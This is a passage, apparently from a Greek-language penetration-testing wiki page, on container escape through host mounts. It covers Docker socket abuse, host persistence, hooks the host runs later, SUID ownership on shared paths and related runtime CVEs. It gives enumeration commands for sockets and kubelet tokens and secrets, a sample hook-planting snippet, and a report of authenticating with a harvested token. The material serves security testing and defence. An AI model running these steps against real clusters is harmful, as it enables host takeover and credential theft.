Αν πετύχει κάποια από αυτές, η διαδρομή από ένα «mounted socket» μέχρι την εκκίνηση ενός πιο προνομιούχου sibling container είναι συνήθως πολύ συντομότερη από οποιαδήποτε διαδρομή διαφυγής από τον kernel.

Η ίδια πρόσβαση στον daemon μπορεί επίσης να επιτρέψει **host persistence**. Ένα helper container με εγγράψιμο host-root bind mount μπορεί να λάβει αρχεία μέσω `docker cp` και, στη συνέχεια, να χρησιμοποιήσει το `docker exec` για να τοποθετήσει ένα SSH key, ένα service unit ή άλλο αρχείο persistence σε μια διαδρομή του προσαρτημένου host. Το όριο ασφαλείας είναι η εξουσία του daemon να δημιουργεί το host mount· το `docker cp` είναι απλώς ένα βήμα προετοιμασίας. Ελέγξτε τόσο τα νέα containers όσο και τις εγγραφές σε διαδρομές ελέγχου ταυτότητας ή εκκίνησης του host μετά την έκθεση ενός runtime socket.

## Υφαρπαγή εργασίας μέσω εγγράψιμης διαδρομής host

Ένα εγγράψιμο host mount δεν χρειάζεται να εκθέτει το `/` για να είναι επικίνδυνο. Αν η προσαρτημένη διαδρομή περιέχει scripts, αρχεία ρυθμίσεων, hooks, plugins ή αρχεία που χρησιμοποιούνται αργότερα από μια προγραμματισμένη εργασία ή υπηρεσία στην πλευρά του host, το container ενδέχεται να μπορεί να αλλάξει αυτό που εκτελεί ο host.

Γενική ροή ελέγχου:

```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```

Αν ένα εγγράψιμο αρχείο χρησιμοποιείται από διεργασία του host, κράτησε το payload απλό και παρατηρήσιμο κατά τη δοκιμή:

```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```

Το ενδιαφέρον σημείο είναι το όριο εμπιστοσύνης: η εγγραφή γίνεται μέσα από το κοντέινερ, αλλά η εκτέλεση γίνεται αργότερα στο περιβάλλον της υπηρεσίας του host. Έτσι, ένα περιορισμένο hostPath ή bind mount μετατρέπεται σε primitive καθυστερημένης εκτέλεσης κώδικα στον host.

## Αρχεία που ανήκουν στον root σε κοινόχρηστο host path

Ένας λογαριασμός κοντέινερ που μπορεί να αποκτήσει δικαιώματα root ενδέχεται να μπορεί να τοποθετήσει ένα αρχείο που ανήκει στον root σε μια εγγράψιμη διαδρομή την οποία χρησιμοποιεί και ο host. Αν το UID 0 του κοντέινερ αντιστοιχεί στο UID 0 του host, και οι δύο όψεις αναφέρονται στο ίδιο αρχείο, ενώ το mount του host επιτρέπει την εκτέλεση SUID, ένας χρήστης του host που μπορεί να εκτελέσει ένα εκτελέσιμο αρχείο SUID που ανήκει στον root από αυτή τη διαδρομή ενδέχεται να παραβιάσει το όριο δικαιωμάτων του host. Για αυτό το συγκεκριμένο ζήτημα ιδιοκτησίας αρχείου, το κοντέινερ δεν χρειάζεται να εκτελείται με `--privileged`. Δείτε τις [αντιστοιχίσεις user namespace](protections/namespaces/user-namespace.md) και τη [συζήτηση για το SUID](privileged-containers.md) για τις ξεχωριστές προϋποθέσεις.

Εξετάστε τη διαδρομή **και από τις δύο πλευρές**: συγκρίνετε την ιδιοκτησία και την ταυτότητα ενός ακίνδυνου αρχείου, ελέγξτε τα `uid_map` και `gid_map` του κοντέινερ και επιθεωρήστε τις επιλογές mount και την πολιτική εκτέλεσης του host. Το `rw` από την πλευρά του κοντέινερ χωρίς `nosuid` είναι απλώς μια πιθανή ένδειξη· δεν αρκεί για να επιβεβαιώσει την ιδιοκτησία στον host, τις σημαίες mount του host, την πρόσβαση ενός χρήστη του host ή το αν το AppArmor/SELinux εμποδίζει την εκτέλεση. Το `noexec` περιορίζει την εκτέλεση στην όψη όπου ισχύει. Οι ετικέτες `shared:` και `master:` στο `/proc/self/mountinfo` περιγράφουν τη διάδοση των mount, όχι το αν τα περιεχόμενα του αρχείου είναι κοινόχρηστα με τον host. Ένα bind mount μπορεί να μην έχει αυτές τις ετικέτες. Η επαναχρησιμοποίηση διαπιστευτηρίων που παρέχει σύνδεση στον host είναι ξεχωριστό βήμα από την παραβίαση του ορίου δικαιωμάτων μέσω κοινόχρηστου αρχείου.

Ο χώρος αποθήκευσης του runtime του host μπορεί να δημιουργήσει παρόμοια διαδρομή ακόμη και χωρίς ρητό bind mount. Το [CVE-2021-41091](https://github.com/moby/moby/security/advisories/GHSA-3fwx-pjgw-3558) επέτρεπε σε έναν μη προνομιούχο χρήστη του host να διασχίζει υποκαταλόγους δεδομένων του Docker και να εκτελεί αρχεία από το filesystem ενός κοντέινερ· το Moby διόρθωσε τα δικαιώματα στην έκδοση 20.10.9 και σημειώνει ότι τα εκτελούμενα κοντέινερ πρέπει να επανεκκινηθούν για να διορθωθούν οι κατάλογοί τους. Εξετάστε τις ακριβείς προσαρτημένες διαδρομές `overlay2/<id>/merged` και τα δικαιώματα αναζήτησης κάθε γονικού καταλόγου. Στη συνέχεια, επιβεβαιώστε αν το UID 0 του κοντέινερ αντιστοιχεί στο UID 0 του host, αν υπάρχει και είναι προσβάσιμο ένα πραγματικό εκτελέσιμο αρχείο SetUID που ανήκει στον root και αν η όψη του host επιτρέπει την εκτέλεση SetUID. Κοντέινερ rootless ή με αντιστοίχιση user namespace, τα `nosuid`, `noexec`, `no_new_privs` και η πολιτική MAC μπορούν να αλλάξουν το αποτέλεσμα. Μια έκδοση runtime ή μια διαδρομή στην οποία επιτρέπεται η διάσχιση αποτελούν απλώς αφορμή για διερεύνηση, όχι απόδειξη εκτέλεσης με δικαιώματα root στον host· επιθεωρήστε τα μεταδεδομένα των mount και των αρχείων χωρίς να εκτελέσετε κάποιο υποψήφιο εκτελέσιμο.

## CVE που σχετίζονται με mount

Τα mount του host σχετίζονται επίσης με ευπάθειες runtime. Σημαντικά πρόσφατα παραδείγματα περιλαμβάνουν:

- Το `CVE-2024-21626` στο `runc`, όπου ένα leaked file descriptor καταλόγου μπορούσε να τοποθετήσει τον κατάλογο εργασίας στο filesystem του host.
- Τα `CVE-2024-23651`, `CVE-2024-23652` και `CVE-2024-23653` στο BuildKit, όπου κακόβουλα Dockerfile, frontends και ροές `RUN --mount` μπορούσαν να επαναφέρουν πρόσβαση σε αρχεία του host, διαγραφή ή αυξημένα δικαιώματα κατά τη διάρκεια των builds.
- Το `CVE-2024-1753` στις ροές build των Buildah και Podman, όπου ειδικά διαμορφωμένα bind mount κατά τη διάρκεια του build μπορούσαν να εκθέσουν το `/` με δικαιώματα ανάγνωσης και εγγραφής.
- Το `CVE-2025-47290` στο `containerd` 2.1.0, όπου ένα TOCTOU κατά την αποσυσκευασία image μπορούσε να επιτρέψει σε ένα ειδικά διαμορφωμένο image να τροποποιήσει το filesystem του host κατά τη λήψη του.

Αυτά τα CVE έχουν σημασία εδώ επειδή δείχνουν ότι ο χειρισμός των mount δεν αφορά μόνο τη διαμόρφωση από τον operator. Και το ίδιο το runtime μπορεί να εισαγάγει συνθήκες διαφυγής που βασίζονται σε mount.

## Έλεγχοι

Χρησιμοποιήστε αυτές τις εντολές για να εντοπίσετε γρήγορα τις εκθέσεις mount με τη μεγαλύτερη αξία:

```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 -type s \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```

Τι είναι ενδιαφέρον εδώ:

- Το host root, τα `/proc`, `/sys`, `/var` και τα runtime sockets είναι όλα ευρήματα υψηλής προτεραιότητας.
- Οι εγγράψιμες εγγραφές proc/sys συχνά σημαίνουν ότι το mount εκθέτει καθολικά controls του kernel του host και όχι μια ασφαλή προβολή του container.
- Οι διαδρομές `/var` που έχουν γίνει mount αξίζουν έλεγχο για credentials και γειτονικά workloads, όχι μόνο έλεγχο του filesystem.
- Οι κατάλογοι κατάστασης του Kubelet και οι διαδρομές CNI/plugin αξίζουν την ίδια προτεραιότητα με τα runtime sockets, επειδή συχνά βρίσκονται απευθείας στη διαδρομή του node για τη δημιουργία pod και τη διανομή credentials.

## Κατάσταση τοπικής επικύρωσης

Οι πρακτικές αλυσίδες σε αυτή τη σελίδα ελέγχθηκαν σε έναν τοπικό Linux minikube node. Η επικύρωση αναπαρήγαγε:

- πρόσβαση ανάγνωσης και εγγραφής μέσω ενός προσωρινού εγγράψιμου hostPath
- εντοπισμό projected ServiceAccount tokens και mounted Secrets μέσω του `/var/lib/kubelet/pods`
- επιτυχή αυθεντικοποίηση στο Kubernetes API με ένα ενεργό token που ανακτήθηκε από αυτή την κατάσταση του mounted kubelet
- εντοπισμό, μόνο για ανάγνωση, ενός γειτονικού filesystem Docker `overlay2` μέσω mounted `/var`
- δημιουργία sibling container μέσω του Docker API, με host bind μόνο για ανάγνωση μέσω mounted `docker.sock`
- καθυστερημένη εκτέλεση στον host μέσω ενός προσωρινού hook που καταναλώνεται από τον host
- προσομοίωση CNI-wrapper που διατήρησε τα ορίσματα, την τυπική είσοδο και την εκτέλεση του αρχικού plugin

Το ίδιο node εξέθετε τα `core_pattern`, `modprobe`, `binfmt_misc/register`, `kallsyms`, `kcore` και `config.gz`, αλλά δεν εξέθετε τα `uevent_helper`, μεταβλητές EFI, thermal entries ή `sched_debug`. Δεν εκτελέστηκαν καταστροφικά kernel triggers. Αυτό επιβεβαιώνει ότι οι αλυσίδες μέσω host-root, `/var`, κατάστασης kubelet, sockets και host-consumer είναι αναπαραγώγιμες, ενώ οι τεχνικές helper μέσω procfs/sysfs πρέπει να παραμένουν υπό όρους, ανάλογα με τον ακριβή kernel, τη λειτουργία του mount, τη διαδρομή του payload και το trigger.

## References

- [1] [Τοπικά αρχεία και διαδρομές που χρησιμοποιεί το Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [2] [Το container cilium-agent μπορεί να αποκτήσει πρόσβαση στον host μέσω mount `hostPath`](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
